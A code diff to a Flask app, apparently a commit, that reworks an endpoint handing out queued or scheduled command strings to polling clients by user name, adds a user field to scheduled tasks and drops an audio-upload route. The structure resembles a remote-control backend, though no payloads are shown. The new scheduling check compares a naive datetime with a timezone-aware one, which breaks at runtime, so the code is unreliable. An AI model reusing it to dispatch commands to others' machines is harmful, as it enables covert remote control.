@@ -115,58 +115,46 @@ def command():
     global startTime
     global selected_user
     global spam
-    # ip = request.headers.get('X-Forwarded-For')
-    # with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
-    #     data = file.read()
-    #     if ip not in data:
-    #         with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
-    #             file.write(f"\nip : {ip} | count : 0\n[----------------------------------------------------------------]")
+    cmd = None
+    taskCmd = None
     if request.method == "POST":
-        user = request.get_json()
-        user = user.get("user")
-        if selected_user == user:
-            startTime = time()
-            cmd = ""
-            message_file = os.path.join(STATIC_FOLDER, "message.txt")
-            tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
+        user = request.get_json().get("user") 
+        message_file = os.path.join(STATIC_FOLDER, "message.txt")
+        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
 
-            if os.path.exists(message_file):
-                with open(message_file, "r") as file:
-                    cmd = file.read()
-
-            if cmd == "":
-                if os.path.exists(tasks_file):
-                    with open(tasks_file, "r") as file:
-                        tasks = json.load(file)
-                    tasks_to_delete = None
-                    for task in tasks["tasks"]:
-                        exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
-                        exe = exe.strftime("%d-%m-%Y %H:%M")
-                        now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
-                        if exe <= now:
-                            cmd = task["cmd"]
-                            tasks_to_delete = task["id"]
-                            break
-                    if tasks_to_delete is not None:
-                        tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
-                        with open(tasks_file, "w") as file:
-                            json.dump(tasks, file, indent=4)
-
+        if os.path.exists(message_file):
+            with open(message_file, "r") as file:
+                cmd = file.read()
+                
+        if cmd and selected_user == user:
             if not spam:
-                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+                with open(message_file, "w") as file:
                     file.write("")
+            startTime = time()
+            return cmd  
+            
+        if os.path.exists(tasks_file):
+            with open(tasks_file, "r") as file:
+                tasks = json.load(file)  
 
-            return cmd if cmd else "none"
+            tasks_to_delete = None
+            for task in tasks["tasks"]:
+                if task["user"] == user:
+                    exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
+                    now = datetime.now(timezone)
+                    if exe <= now:
+                        taskCmd = task["cmd"]
+                        tasks_to_delete = task["id"]  
+                        break
+
+            if tasks_to_delete:
+                tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
+                with open(tasks_file, "w") as file:
+                    json.dump(tasks, file, indent=4)
+
+        if taskCmd:
+            return taskCmd
     return "none"
-
-@app.route("/audio", methods=["POST", "GET"])
-def sounds():
-    if request.method == "POST":
-        file = request.files["file"]
-        if file and file.filename != "":
-            if file.filename.endswith(('.mp3', '.wav', '.ogg')):
-                file.save(os.path.join(UPLOAD_FOLDER, file.filename))
-        return redirect("/")
 
 @app.route("/play", methods=["POST", "GET"])
 def play():
@@ -243,7 +231,8 @@ def schedule():
         task = {
             "id": len(data["tasks"]),
             "cmd": cmd,
-            "execution_time": execution_time.strftime("%d-%m-%Y %H:%M")
+            "execution_time": execution_time.strftime("%d-%m-%Y %H:%M"),
+            "user":request.form["user"]
         }
         data["tasks"].append(task)
 
